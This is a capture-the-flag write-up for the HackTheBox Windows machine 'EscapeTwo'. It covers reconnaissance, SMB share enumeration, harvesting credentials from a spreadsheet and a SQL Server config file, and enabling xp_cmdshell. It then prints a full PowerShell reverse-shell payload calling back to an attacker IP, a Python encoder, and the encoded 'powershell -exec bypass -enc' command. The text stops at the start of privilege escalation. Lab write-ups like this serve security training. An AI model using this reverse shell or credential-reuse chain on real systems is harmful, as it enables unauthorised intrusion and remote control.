---
title: EscapeTwo
tags:
  - HackTheBox
  - Easy
  - Windows
  - SMB
date: 2025-03-13T00:00:00Z
---
![](Pasted%20image%2020250313225715.png)

>[!Info]
>As is common in real life Windows pentests, you will start this box with credentials for the following account: `rose / KxEPkKe6R8su`

## Reconnaissance

First, I added the new host to my known ones:

```shell
sudo echo "10.10.11.51 sequel.htb" | sudo tee -a /etc/hosts
```

Then, I performed a Nmap scan:

```shell
nmap -sC -T4 sequel.htb > sC.txt

[redacted]
PORT   STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
|_ssl-date: 2025-03-13T22:02:12+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
|_ssl-date: 2025-03-13T22:01:40+00:00; 0s from scanner time.
1433/tcp open  ms-sql-s
| ms-sql-ntlm-info: 
|   10.10.11.51:1433: 
|     Target_Name: SEQUEL
|     NetBIOS_Domain_Name: SEQUEL
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: sequel.htb
|     DNS_Computer_Name: DC01.sequel.htb
|     DNS_Tree_Name: sequel.htb
|_    Product_Version: 10.0.17763
| ms-sql-info: 
|   10.10.11.51:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_ssl-date: 2025-03-13T22:02:12+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-03-13T08:21:16
|_Not valid after:  2055-03-13T08:21:16
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
|_ssl-date: 2025-03-13T22:01:40+00:00; 0s from scanner time.
5985/tcp open  wsman

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-03-13T22:01:45
|_  start_date: N/A
```

## Enumeration

I'll test SMB with nxc and without credentials:

```shell
nxc smb sequel.htb --users
SMB         10.10.11.51     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
```

Didn't get much info, but I'll test with `rose` credentials:

```shell
nxc smb sequel.htb --users -u rose -p KxEPkKe6R8su

SMB         10.10.11.51     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.51     445    DC01             [+] sequel.htb\rose:KxEPkKe6R8su 
SMB         10.10.11.51     445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-                                                 
SMB         10.10.11.51     445    DC01             Administrator                 2024-06-08 16:32:20 0       Built-in account for administering the computer/domain        
SMB         10.10.11.51     445    DC01             Guest                         2024-12-25 14:44:53 0       Built-in account for guest access to the computer/domain      
SMB         10.10.11.51     445    DC01             krbtgt                        2024-06-08 16:40:23 0       Key Distribution Center Service Account                       
SMB         10.10.11.51     445    DC01             michael                       2024-06-08 16:47:37 0                                                                     
SMB         10.10.11.51     445    DC01             ryan                          2024-06-08 16:55:45 0                                                                     
SMB         10.10.11.51     445    DC01             oscar                         2024-06-08 16:56:36 0                                                                     
SMB         10.10.11.51     445    DC01             sql_svc                       2024-06-09 07:58:42 0                                                                     
SMB         10.10.11.51     445    DC01             rose                          2024-12-25 14:44:54 0                                                                     
SMB         10.10.11.51     445    DC01             ca_svc                        2025-03-13 22:27:29 0                                                                     
SMB         10.10.11.51     445    DC01             [*] Enumerated 9 local users: SEQUEL
```

Got some users.

So I'll test SMB port `139`:

```shell
smbclient -U rose -L sequel.htb
Password for [WORKGROUP\rose]:

Sharename       Type      Comment
---------       ----      -------
Accounting Department Disk      
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
NETLOGON        Disk      Logon server share 
SYSVOL          Disk      Logon server share 
Users           Disk
```

Then I inspected `Users` share:

```shell
smbclient -U rose //10.10.11.51/Users
smb: \> dir
  .                                  DR        0  Sun Jun  9 15:42:11 2024
  ..                                 DR        0  Sun Jun  9 15:42:11 2024
  Default                           DHR        0  Sun Jun  9 13:17:29 2024
  desktop.ini                       AHS      174  Sat Sep 15 09:16:48 2018
```

![](Pasted%20image%2020250313230800.png)

```shell
LocalizedResourceName=@%SystemRoot%\system32\shell32.dll,-21813
```

Inspecting `Default` directory I found a lot:

```shell
smb: \Default\> dir
  .                                 DHR        0  Sun Jun  9 13:17:29 2024
  ..                                DHR        0  Sun Jun  9 13:17:29 2024
  AppData                            DH        0  Sat Sep 15 09:19:00 2018
  Desktop                            DR        0  Sat Sep 15 09:19:00 2018
  Documents                          DR        0  Sun Jun  9 03:29:57 2024
  Downloads                          DR        0  Sat Sep 15 09:19:00 2018
  Favorites                          DR        0  Sat Sep 15 09:19:00 2018
  Links                              DR        0  Sat Sep 15 09:19:00 2018
  Music                              DR        0  Sat Sep 15 09:19:00 2018
  NTUSER.DAT                          A   262144  Sun Jun  9 03:29:57 2024
  NTUSER.DAT.LOG1                   AHS    57344  Sat Sep 15 08:09:26 2018
  NTUSER.DAT.LOG2                   AHS        0  Sat Sep 15 08:09:26 2018
  NTUSER.DAT{1c3790b4-b8ad-11e8-aa21-e41d2d101530}.TM.blf    AHS    65536  Sun Jun  9 03:29:57 2024
  NTUSER.DAT{1c3790b4-b8ad-11e8-aa21-e41d2d101530}.TMContainer00000000000000000001.regtrans-ms    AHS   524288  Sun Jun  9 03:29:57 2024
  NTUSER.DAT{1c3790b4-b8ad-11e8-aa21-e41d2d101530}.TMContainer00000000000000000002.regtrans-ms    AHS   524288  Sun Jun  9 03:29:57 2024
  Pictures                           DR        0  Sat Sep 15 09:19:00 2018
  Saved Games                         D        0  Sat Sep 15 09:19:00 2018
  Videos                             DR        0  Sat Sep 15 09:19:00 2018
```

Got nothing, so I checked the share `Accounting Department`:

```shell
smbclient -U rose //10.10.11.51/Accounting\ Department
Password for [WORKGROUP\rose]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sun Jun  9 12:52:21 2024
  ..                                  D        0  Sun Jun  9 12:52:21 2024
  accounting_2024.xlsx                A    10217  Sun Jun  9 12:14:49 2024
  accounts.xlsx                       A     6780  Sun Jun  9 12:52:07 2024
```

If we inspect the content of `accounts.xlsx` we find some credentials:

![](Pasted%20image%2020250313232739.png)

Now I'll ingest data o tained to **bloodhound**:

```shell
bloodhound-python -d sequel.htb -dc DC01.sequel.htb -ns 10.10.11.51 -u rose -p KxEPkKe6R8su -c all --zip
```

I'll paste the generated zip into **bloodhound**:

![](Pasted%20image%2020250316205358.png)

Now I'll enter the mssql with the username `sa` and try to get a shell:

```shell
impacket-mssqlclient sequel.htb/sa:'MSSQLP@ssw0rd!'@10.10.11.51

enable_xp_cmdshell
INFO(DC01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
INFO(DC01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
```

![](Pasted%20image%2020250316210903.png)

## Exploitation

So I'll generate a reverse shell
- Got the content from [Mayfly227](https://mayfly277.github.io/posts/GOADv2-pwning-part7/#command-execution-to-shell) -> ==INSANE BLOG==

```shell
$c = New-Object System.Net.Sockets.TCPClient('10.10.14.30',666);
$s = $c.GetStream();[byte[]]$b = 0..65535|%{0};
while(($i = $s.Read($b, 0, $b.Length)) -ne 0){
    $d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);
    $sb = (iex $d 2>&1 | Out-String );
    $sb = ([text.encoding]::ASCII).GetBytes($sb + 'ps> ');
    $s.Write($sb,0,$sb.Length);
    $s.Flush()
};
$c.Close()
```

Encode it in base64 using the following script:

```python
#!/usr/bin/env python
import base64
import sys

if len(sys.argv) < 3:
  print('usage : %s ip port' % sys.argv[0])
  sys.exit(0)

payload="""
$c = New-Object System.Net.Sockets.TCPClient('%s',%s);
$s = $c.GetStream();[byte[]]$b = 0..65535|%%{0};
while(($i = $s.Read($b, 0, $b.Length)) -ne 0){
    $d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);
    $sb = (iex $d 2>&1 | Out-String );
    $sb = ([text.encoding]::ASCII).GetBytes($sb + 'ps> ');
    $s.Write($sb,0,$sb.Length);
    $s.Flush()
};
$c.Close()
""" % (sys.argv[1], sys.argv[2])

byte = payload.encode('utf-16-le')
b64 = base64.b64encode(byte)
print("powershell -exec bypass -enc %s" % b64.decode())
```

```shell
powershell -exec bypass -enc CgAkAGMAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBTAG8AYwBrAGUAdABzAC4AVABDAFAAQwBsAGkAZQBuAHQAKAAnADEAMAAuADEAMAAuADEANAAuADMAMAAnACwANgA2ADYAKQA7AAoAJABzACAAPQAgACQAYwAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AAoAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAC4AUgBlAGEAZAAoACQAYgAsACAAMAAsACAAJABiAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewAKACAAIAAgACAAJABkACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIALAAwACwAIAAkAGkAKQA7AAoAIAAgACAAIAAkAHMAYgAgAD0AIAAoAGkAZQB4ACAAJABkACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7AAoAIAAgACAAIAAkAHMAYgAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBiACAAKwAgACcAcABzAD4AIAAnACkAOwAKACAAIAAgACAAJABzAC4AVwByAGkAdABlACgAJABzAGIALAAwACwAJABzAGIALgBMAGUAbgBnAHQAaAApADsACgAgACAAIAAgACQAcwAuAEYAbAB1AHMAaAAoACkACgB9ADsACgAkAGMALgBDAGwAbwBzAGUAKAApAAoA
```

### User flag

Enumerating the machine I found `sqlsvc`'s credentials inside `C:\SQL2019\ExpressAdv_ENU`:

```shell
[OPTIONS]
ACTION="Install"
QUIET="True"
FEATURES=SQL
INSTANCENAME="SQLEXPRESS"
INSTANCEID="SQLEXPRESS"
RSSVCACCOUNT="NT Service\ReportServer$SQLEXPRESS"
AGTSVCACCOUNT="NT AUTHORITY\NETWORK SERVICE"
AGTSVCSTARTUPTYPE="Manual"
COMMFABRICPORT="0"
COMMFABRICNETWORKLEVEL=""0"
COMMFABRICENCRYPTION="0"
MATRIXCMBRICKCOMMPORT="0"
SQLSVCSTARTUPTYPE="Automatic"
FILESTREAMLEVEL="0"
ENABLERANU="False" 
SQLCOLLATION="SQL_Latin1_General_CP1_CI_AS"
SQLSVCACCOUNT="SEQUEL\sql_svc"
SQLSVCPASSWORD="WqSZAF6CysDQbGb3"
SQLSYSADMINACCOUNTS="SEQUEL\Administrator"
SECURITYMODE="SQL"
SAPWD="MSSQLP@ssw0rd!"
ADDCURRENTUSERASSQLADMIN="False"
TCPENABLED="1"
NPENABLED="1"
BROWSERSVCSTARTUPTYPE="Automatic"
IAcceptSQLServerLicenseTerms=True
```

Now I'll log in with **evil-winrm** and found that user `ryan` is reusing the password:

```shell
evil-winrm -i 10.10.11.51 -u ryan -p WqSZAF6CysDQbGb3
```

![](Pasted%20image%2020250316213317.png)

## Privilege Escalation

Now in **bloodhound** I'll select **Shortest Paths >> Shortest paths from Owned Principals >> Ryan**.

